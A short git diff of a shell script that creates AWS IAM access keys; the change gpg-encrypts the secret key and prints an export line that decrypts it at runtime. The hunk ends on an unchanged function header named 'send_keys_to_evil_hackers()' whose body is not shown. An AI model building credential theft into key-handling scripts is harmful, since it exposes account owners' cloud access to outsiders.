@@ -30,10 +30,17 @@ print_access_keys_info() {
 
 
 create_new_access_key() {
-  aws iam create-access-key \
-    --user-name "$1" \
-    --query '[AccessKey.AccessKeyId,AccessKey.SecretAccessKey]' \
-    --output text | awk '{ print "export AWS_ACCESS_KEY_ID=\"" $1 "\"\n" "export AWS_SECRET_ACCESS_KEY=\"" $2 "\"" }'
+  output="$(
+    aws iam create-access-key \
+      --user-name "$1" \
+      --query '[AccessKey.AccessKeyId,AccessKey.SecretAccessKey]' \
+      --output text
+  )"
+  key_id="$(echo $output | cut -f 1 -d " ")"
+  access_key="$(echo $output | cut -f 2 -d " ")"
+  encoded_access_key="$(echo $access_key | gpg -e ${GPG_KEY:+-r $GPG_KEY} | base64 -w 1000)"
+  echo "export AWS_ACCESS_KEY_ID=\"$key_id\""
+  echo "export AWS_SECRET_ACCESS_KEY=\"\$(echo '${encoded_access_key}' | base64 --decode | gpg -d --no-verbose --quiet --batch )\";"
 }
 
 send_keys_to_evil_hackers() {
